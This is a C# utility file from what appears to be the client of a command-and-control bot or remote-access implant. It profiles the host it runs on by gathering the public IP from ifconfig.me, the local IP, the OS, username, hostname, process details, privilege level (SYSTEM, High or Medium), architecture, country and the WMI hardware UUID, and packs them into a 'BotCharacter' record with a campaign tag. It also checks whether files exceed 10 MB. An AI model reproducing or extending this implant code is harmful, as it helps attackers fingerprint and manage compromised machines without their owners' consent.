using pattaya_project_client.Models;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;


namespace pattaya_project_client.Utils
{
    public static class BotUtil
    {

        private static Random random = new Random();
        public static BotCharacter GenerateChracter()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            var botCharacter = new BotCharacter
            {
                WanIp = GetPublicIpAddress(),
                LanIp = GetLocalIPAddress(),
                Os = System.Runtime.InteropServices.RuntimeInformation.OSDescription,
                Username = identity.Name,
                Hostname = Environment.MachineName,
                ProcessName = String.Concat(process.ProcessName, ".exe"),
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Country = RegionInfo.CurrentRegion.TwoLetterISORegionName,
                HWID = GetHardwareId(),
                Type = Config.Type,
                Version = Config.Version,
                Tag = Config.Tag,
            };

            process.Dispose();
            identity.Dispose();

            return botCharacter;
        }



        private static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "0.0.0.0";
        }


        private static string GetPublicIpAddress()
        {
            var request = (HttpWebRequest)WebRequest.Create("http://ifconfig.me");

            request.UserAgent = "curl";

            string publicIPAddress;

            request.Method = "GET";
            using (WebResponse response = request.GetResponse())
            {
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    publicIPAddress = reader.ReadToEnd();
                }
            }

            return publicIPAddress.Replace("\n", "");
        }

        private static string GetHardwareId()
        {
            string hardwareId = string.Empty;
            ManagementClass mc = new ManagementClass("Win32_ComputerSystemProduct");
            ManagementObjectCollection moc = mc.GetInstances();

            foreach (ManagementObject mo in moc)
            {
                hardwareId = mo.Properties["UUID"].Value.ToString();
                break;
            }

            return hardwareId;
        }

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static bool isFileSizeExceed(string filePath)
        {
            FileInfo fileInfo = new FileInfo(filePath);

            if (fileInfo.Length > 10 * 1024 * 1024)
            {
                return true;
            }
            return false;
        }
    }
}
